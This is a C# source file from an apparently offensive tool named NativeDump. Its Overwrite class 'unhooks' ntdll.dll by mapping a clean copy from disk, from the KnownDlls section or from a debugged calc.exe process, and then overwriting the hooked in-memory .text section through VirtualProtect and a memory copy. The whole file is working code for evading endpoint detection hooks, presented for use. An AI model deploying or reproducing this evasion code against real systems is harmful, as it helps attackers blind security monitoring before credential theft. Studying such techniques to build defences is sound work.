using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using static NativeDump.Win32;

namespace NativeDump
{
    internal class Overwrite
    {
        public static IntPtr GetLocalNtdll()
        {
            Console.WriteLine("\t[+] Searching for ntdll.dll in current process modules...");
            foreach (ProcessModule mod in Process.GetCurrentProcess().Modules)
            {
                if (mod.ModuleName.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("\t[+] Found ntdll.dll:");
                    Console.WriteLine("\t    Module name:                " + mod.ModuleName);
                    Console.WriteLine("\t    Base address:               0x" + mod.BaseAddress.ToString("X"));
                    Console.WriteLine("\t    Module size:                0x" + mod.ModuleMemorySize.ToString("X") + " (" + mod.ModuleMemorySize + " bytes)");
                    Console.WriteLine("\t    File path:                  " + mod.FileName);
                    return mod.BaseAddress;
                }
            }
            Console.WriteLine("\t[-] ntdll.dll not found in process modules!");
            return IntPtr.Zero;
        }


        public static int[] GetTextSectionInfo(IntPtr ntdl_address)
        {
            IntPtr hProcess = Process.GetCurrentProcess().Handle;
            Console.WriteLine("\t[+] Parsing PE headers at base address 0x" + ntdl_address.ToString("X") + "...");

            byte[] data = new byte[2];
            uint bytesRead;
            ReadProcessMemory(hProcess, ntdl_address, data, data.Length, out bytesRead);
            string signature_dos_header = Encoding.Default.GetString(data);
            Console.WriteLine("\t    DOS Header signature:       '" + signature_dos_header + "' (expected 'MZ')");
            if (signature_dos_header != "MZ")
            {
                Console.WriteLine("\t[-] Incorrect DOS header signature! Aborting.");
                Environment.Exit(0);
            }

            data = new byte[4];
            IntPtr e_lfanew_addr = ntdl_address + 0x3C;
            ReadProcessMemory(hProcess, e_lfanew_addr, data, 4, out bytesRead);
            int e_lfanew = BitConverter.ToInt32(data, 0);
            Console.WriteLine("\t    e_lfanew offset:            0x" + e_lfanew.ToString("X") + " (at address 0x" + e_lfanew_addr.ToString("X") + ")");

            IntPtr image_nt_headers_addr = ntdl_address + e_lfanew;
            data = new byte[2];
            ReadProcessMemory(hProcess, image_nt_headers_addr, data, data.Length, out bytesRead);
            string signature_nt_header = Encoding.Default.GetString(data);
            Console.WriteLine("\t    NT Header signature:        '" + signature_nt_header + "' (expected 'PE') at 0x" + image_nt_headers_addr.ToString("X"));
            if (signature_nt_header != "PE")
            {
                Console.WriteLine("\t[-] Incorrect NT header signature! Aborting.");
                Environment.Exit(0);
            }

            IntPtr optional_headers_addr = image_nt_headers_addr + 24;
            data = new byte[4];
            ReadProcessMemory(hProcess, optional_headers_addr, data, data.Length, out bytesRead);
            int optional_header_magic = BitConverter.ToInt16(data, 0);
            Console.WriteLine("\t    Optional Header magic:      0x" + optional_header_magic.ToString("X") + (optional_header_magic == 0x20B ? " (PE32+/64-bit)" : optional_header_magic == 0x10B ? " (PE32/32-bit)" : " (UNKNOWN)"));
            if (optional_header_magic != 0x20B && optional_header_magic != 0x10B)
            {
                Console.WriteLine("\t[-] Incorrect Optional Header Magic! Aborting.");
                Environment.Exit(0);
            }

            IntPtr sizeofcode_addr = optional_headers_addr + 4;
            data = new byte[4];
            ReadProcessMemory(hProcess, sizeofcode_addr, data, data.Length, out bytesRead);
            int sizeofcode = BitConverter.ToInt32(data, 0);
            Console.WriteLine("\t    SizeOfCode (.text size):    0x" + sizeofcode.ToString("X") + " (" + sizeofcode + " bytes)");

            IntPtr baseofcode_addr = optional_headers_addr + 20;
            data = new byte[4];
            ReadProcessMemory(hProcess, baseofcode_addr, data, data.Length, out bytesRead);
            int baseofcode = BitConverter.ToInt32(data, 0);
            Console.WriteLine("\t    BaseOfCode (.text RVA):     0x" + baseofcode.ToString("X"));

            int[] result = { baseofcode, sizeofcode };
            return result;
        }


        public static IntPtr MapNtdllFromDisk(string ntdll_path)
        {
            Console.WriteLine("\t[+] Opening file: " + ntdll_path);

            IntPtr hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            Console.WriteLine("\t[+] CreateFileA handle:         0x" + hFile.ToString("X"));
            if (hFile == IntPtr.Zero || hFile == (IntPtr)(-1))
            {
                Console.WriteLine("\t[-] Error calling CreateFileA. LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }

            IntPtr hSection = CreateFileMappingA(hFile, 0, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, "");
            Console.WriteLine("\t[+] CreateFileMappingA handle:  0x" + hSection.ToString("X"));
            if (hSection == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Error calling CreateFileMappingA. LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }

            IntPtr pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
            Console.WriteLine("\t[+] MapViewOfFile address:      0x" + pNtdllBuffer.ToString("X"));
            if (pNtdllBuffer == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Error calling MapViewOfFile. LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }

            bool ch1 = CloseHandle(hFile);
            bool ch2 = CloseHandle(hSection);
            Console.WriteLine("\t[+] CloseHandle (file):         " + ch1);
            Console.WriteLine("\t[+] CloseHandle (mapping):      " + ch2);
            if (!ch1 || !ch2)
            {
                Console.WriteLine("\t[-] Error calling CloseHandle");
                Environment.Exit(0);
            }

            return pNtdllBuffer;
        }


        public static IntPtr MapNtdllFromKnownDlls()
        {
            string dll_name = "\\KnownDlls\\ntdll.dll";
            if (IntPtr.Size == 4)
            {
                dll_name = "\\KnownDlls32\\ntdll.dll";
            }
            Console.WriteLine("\t[+] Section path: " + dll_name);

            OBJECT_ATTRIBUTES_FULL oa = InitializeObjectAttributes(dll_name, OBJ_CASE_INSENSITIVE);
            Console.WriteLine("\t[+] OBJECT_ATTRIBUTES Length:   " + oa.Length);
            Console.WriteLine("\t[+] OBJECT_ATTRIBUTES Attr:     0x" + oa.Attributes.ToString("X") + " (OBJ_CASE_INSENSITIVE)");

            IntPtr hSection = IntPtr.Zero;
            uint NtStatus = NtOpenSection(ref hSection, SECTION_MAP_READ, ref oa);
            Console.WriteLine("\t[+] NtOpenSection NTSTATUS:     0x" + NtStatus.ToString("X"));
            Console.WriteLine("\t[+] NtOpenSection handle:       0x" + hSection.ToString("X"));
            if (NtStatus != 0)
            {
                Console.WriteLine("\t[-] Error calling NtOpenSection. NTSTATUS: 0x" + NtStatus.ToString("X"));
                Marshal.FreeHGlobal(oa.ObjectName);
                Environment.Exit(0);
            }

            IntPtr pNtdllBuffer = MapViewOfFile(hSection, (uint)SECTION_MAP_READ, 0, 0, 0);
            Console.WriteLine("\t[+] MapViewOfFile address:      0x" + pNtdllBuffer.ToString("X"));
            if (pNtdllBuffer == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Error calling MapViewOfFile. LastError: " + Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(oa.ObjectName);
                Environment.Exit(0);
            }

            bool ch = CloseHandle(hSection);
            Console.WriteLine("\t[+] CloseHandle (section):      " + ch);

            Marshal.FreeHGlobal(oa.ObjectName);
            return pNtdllBuffer;
        }


        public unsafe static IntPtr GetNtdllFromDebugProc(string process_path)
        {
            Console.WriteLine("\t[+] Target process: " + process_path);

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool createprocess_res = CreateProcess(process_path, null, IntPtr.Zero, IntPtr.Zero, false, DEBUG_PROCESS, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("\t[+] CreateProcess result:       " + createprocess_res);
            if (!createprocess_res)
            {
                Console.WriteLine("\t[-] Error calling CreateProcess. LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }
            Console.WriteLine("\t[+] Debug process handle:       0x" + pi.hProcess.ToString("X"));
            Console.WriteLine("\t[+] Debug thread handle:        0x" + pi.hThread.ToString("X"));
            Console.WriteLine("\t[+] Debug process PID:          " + pi.dwProcessId);
            Console.WriteLine("\t[+] Debug thread TID:           " + pi.dwThreadId);

            Console.WriteLine("\t[+] Getting local ntdll .text section info...");
            IntPtr localNtdllHandle = GetLocalNtdll();
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;
            Console.WriteLine("\t[+] Local ntdll .text address:  0x" + localNtdllTxt.ToString("X"));
            Console.WriteLine("\t[+] Local ntdll .text size:     " + localNtdllTxtSize + " bytes");

            Console.WriteLine("\t[+] Reading " + localNtdllTxtSize + " bytes from debug process at 0x" + localNtdllTxt.ToString("X") + "...");
            byte[] ntdllBuffer = new byte[localNtdllTxtSize];
            uint bytesRead;
            uint readprocmem_res = ReadProcessMemory(pi.hProcess, localNtdllTxt, ntdllBuffer, ntdllBuffer.Length, out bytesRead);
            Console.WriteLine("\t[+] ReadProcessMemory result:   " + readprocmem_res);
            Console.WriteLine("\t[+] Bytes read:                 " + bytesRead);
            if (readprocmem_res == 0)
            {
                Console.WriteLine("\t[-] Error calling ReadProcessMemory. LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }

            IntPtr pNtdllBuffer = IntPtr.Zero;
            fixed (byte* p = ntdllBuffer)
            {
                pNtdllBuffer = (IntPtr)p;
            }
            Console.WriteLine("\t[+] Buffer pointer:             0x" + pNtdllBuffer.ToString("X"));

            bool debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
            Console.WriteLine("\t[+] DebugActiveProcessStop:     " + debugstop_res);
            bool terminateproc_res = TerminateProcess(pi.hProcess, 0);
            Console.WriteLine("\t[+] TerminateProcess:           " + terminateproc_res);
            if (!debugstop_res || !terminateproc_res)
            {
                Console.WriteLine("\t[!] Warning: DebugActiveProcessStop or TerminateProcess returned false");
            }

            bool ch_proc = CloseHandle(pi.hProcess);
            bool ch_thread = CloseHandle(pi.hThread);
            Console.WriteLine("\t[+] CloseHandle (process):      " + ch_proc);
            Console.WriteLine("\t[+] CloseHandle (thread):       " + ch_thread);

            return pNtdllBuffer;
        }


        static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
        {
            Console.WriteLine("\t[+] Replacing .text section...");
            Console.WriteLine("\t    Source (clean):             0x" + unhookedNtdllTxt.ToString("X"));
            Console.WriteLine("\t    Destination (hooked):       0x" + localNtdllTxt.ToString("X"));
            Console.WriteLine("\t    Size:                       " + localNtdllTxtSize + " bytes (0x" + localNtdllTxtSize.ToString("X") + ")");

            uint dwOldProtection;
            bool vp1_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
            Console.WriteLine("\t[+] VirtualProtect -> WRITECOPY: " + vp1_res);
            Console.WriteLine("\t    Old protection:             0x" + dwOldProtection.ToString("X"));
            if (!vp1_res)
            {
                Console.WriteLine("\t[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY). LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }

            unsafe
            {
                Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
            }
            Console.WriteLine("\t[+] Buffer.MemoryCopy:          " + localNtdllTxtSize + " bytes copied");

            uint dwDummy;
            bool vp2_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, dwOldProtection, out dwDummy);
            Console.WriteLine("\t[+] VirtualProtect -> restore:  " + vp2_res);
            Console.WriteLine("\t    Restored protection:        0x" + dwOldProtection.ToString("X"));
            if (!vp2_res)
            {
                Console.WriteLine("\t[-] Error calling VirtualProtect (restore). LastError: " + Marshal.GetLastWin32Error());
                Environment.Exit(0);
            }
        }


        public static void ReplaceLibrary(string option, string wildcard_field)
        {
            if (string.IsNullOrEmpty(option) || option == "default" || option == "none")
            {
                Console.WriteLine("[*] No ntdll overwrite selected, skipping.");
                return;
            }

            IntPtr unhookedNtdllTxt = IntPtr.Zero;

            switch (option)
            {
                case "disk":
                    Console.WriteLine("[+] === NTDLL OVERWRITE: DISK ===");
                    if (string.IsNullOrEmpty(wildcard_field))
                    {
                        wildcard_field = "C:\\Windows\\System32\\ntdll.dll";
                    }
                    IntPtr unhookedNtdllHandle = MapNtdllFromDisk(wildcard_field);
                    Console.WriteLine("\t[+] Mapped ntdll handle:        0x" + unhookedNtdllHandle.ToString("X"));
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
                    Console.WriteLine("\t[+] Mapped ntdll .text offset:  0x" + offset_mappeddll.ToString("X") + " (" + offset_mappeddll + " bytes)");
                    Console.WriteLine("\t[+] Mapped ntdll .text addr:    0x" + unhookedNtdllTxt.ToString("X"));
                    break;

                case "knowndlls":
                    Console.WriteLine("[+] === NTDLL OVERWRITE: KNOWNDLLS ===");
                    unhookedNtdllHandle = MapNtdllFromKnownDlls();
                    Console.WriteLine("\t[+] Mapped ntdll handle:        0x" + unhookedNtdllHandle.ToString("X"));
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
                    Console.WriteLine("\t[+] Mapped ntdll .text offset:  0x" + offset_mappeddll.ToString("X") + " (" + offset_mappeddll + " bytes)");
                    Console.WriteLine("\t[+] Mapped ntdll .text addr:    0x" + unhookedNtdllTxt.ToString("X"));
                    break;

                case "debugproc":
                    Console.WriteLine("[+] === NTDLL OVERWRITE: DEBUG PROCESS ===");
                    if (string.IsNullOrEmpty(wildcard_field))
                    {
                        wildcard_field = "c:\\windows\\system32\\calc.exe";
                    }
                    unhookedNtdllTxt = GetNtdllFromDebugProc(wildcard_field);
                    Console.WriteLine("\t[+] Clean .text buffer addr:    0x" + unhookedNtdllTxt.ToString("X"));
                    break;

                default:
                    Console.WriteLine("[-] Unknown overwrite option: '" + option + "'. Valid: disk, knowndlls, debugproc");
                    return;
            }

            Console.WriteLine("\t[+] --- Local ntdll info ---");
            IntPtr localNtdllHandle = GetLocalNtdll();
            if (localNtdllHandle == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed to find local ntdll.dll!");
                Environment.Exit(0);
            }
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;
            Console.WriteLine("\t[+] Local ntdll base:           0x" + localNtdllHandle.ToString("X"));
            Console.WriteLine("\t[+] Local ntdll .text RVA:      0x" + localNtdllTxtBase.ToString("X"));
            Console.WriteLine("\t[+] Local ntdll .text addr:     0x" + localNtdllTxt.ToString("X"));
            Console.WriteLine("\t[+] Local ntdll .text size:     " + localNtdllTxtSize + " bytes (0x" + localNtdllTxtSize.ToString("X") + ")");

            Console.WriteLine("\t[+] Copying " + localNtdllTxtSize + " bytes from 0x" + unhookedNtdllTxt.ToString("X") + " to 0x" + localNtdllTxt.ToString("X"));
            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize);
            Console.WriteLine("[+] Ntdll .text section replaced successfully!");
            Console.WriteLine("");
        }
    }
}
